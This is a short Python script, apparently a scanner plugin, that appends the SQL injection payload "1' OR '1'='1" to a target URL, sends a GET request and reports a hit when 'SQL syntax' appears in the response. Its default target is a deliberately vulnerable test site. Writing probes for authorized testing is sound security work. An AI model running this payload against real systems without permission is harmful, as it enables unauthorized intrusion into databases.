import requests

def run(target):
    # SQL注入示例：使用'1'='1
    payload = "1' OR '1'='1"
    url = f"{target}{payload}"
    
    try:
        response = requests.get(url)
        if "SQL syntax" in response.text:
            return {"status": "success", "message": "SQL injection detected", "payload": payload}
        else:
            return {"status": "fail", "message": "No SQL injection detected"}
    except requests.RequestException as e:
        return {"status": "error", "message": f"Request error: {str(e)}"}
if __name__ == "__main__":
    target = "http://testasp.vulnweb.com"
    result = run(target)
    print(result)